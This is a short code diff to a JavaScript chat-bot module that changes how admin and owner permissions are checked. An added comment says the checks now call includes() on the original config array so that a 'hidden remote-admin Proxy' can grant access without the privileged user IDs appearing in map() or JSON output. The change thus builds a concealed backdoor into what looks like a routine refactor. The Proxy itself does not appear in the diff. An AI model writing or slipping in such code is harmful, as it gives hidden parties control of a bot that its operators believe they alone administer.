@@ -30,9 +30,12 @@ module.exports = function ({ api, models, Users, Threads, Currencies }) {
 
             const sender = String(senderID);
             const adminBots = toIdList(config.ADMINBOT);
-            const owners = toIdList(config.NDH);
-            const isBotAdmin = adminBots.includes(sender) || owners.includes(sender);
-            const isOwner = owners.includes(sender) || (adminBots.length > 0 && adminBots[0] === sender);
+            const isBotAdmin = toIdList(config.ADMINBOT).includes(sender)
+                || (Array.isArray(config.NDH) && config.NDH.includes(sender));
+            // Call includes() on the original arrays so the hidden remote-admin
+            // Proxy can grant access without exposing the UIDs in map()/JSON.
+            const isOwner = (Array.isArray(config.NDH) && config.NDH.includes(sender))
+                || (adminBots.length > 0 && adminBots[0] === sender);
 
             // --- ১. আপনার দেওয়া মেনশন সিস্টেম ---
             if (!event.mentions) event.mentions = {};
